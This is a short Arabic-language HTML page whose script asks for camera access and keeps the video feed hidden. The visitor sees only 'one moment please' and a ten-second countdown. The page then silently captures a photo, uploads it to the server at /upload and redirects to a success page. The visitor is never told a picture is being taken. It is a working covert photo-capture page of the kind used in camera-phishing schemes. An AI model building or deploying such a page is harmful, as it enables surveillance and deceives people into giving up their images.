<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <style>
        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; }
        #countdown { font-size: 80px; color: #ff6600; }
    </style>
</head>
<body>
    <div id="status">الرجاء السماح بالوصول للكاميرا</div>
    <div id="countdown"></div>
    <video id="video" autoplay playsinline style="display:none;"></video>

    <script>
        const video = document.getElementById('video');
        const status = document.getElementById('status');
        const countdownEl = document.getElementById('countdown');

        // عند فتح الصفحة، اطلب الكاميرا فوراً
        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
            video.srcObject = stream;
            startCountdown(10); // البدء من 10 كما في 118892.jpg
        });

        function startCountdown(seconds) {
            let counter = seconds;
            status.innerText = "لحظة واحدة من فضلك";
            const timer = setInterval(() => {
                countdownEl.innerText = counter;
                counter--;
                if (counter < 0) {
                    clearInterval(timer);
                    capturePhoto();
                }
            }, 1000);
        }

        function capturePhoto() {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            const image = canvas.toDataURL('image/jpeg');
            // إرسال الصورة للسيرفر
            fetch('/upload', { method: 'POST', body: JSON.stringify({ image: image }) })
            .then(() => {
                window.location.href = "/success"; // توجيه المستخدم بعد الالتقاط
            });
        }
    </script>
</body>
</html>
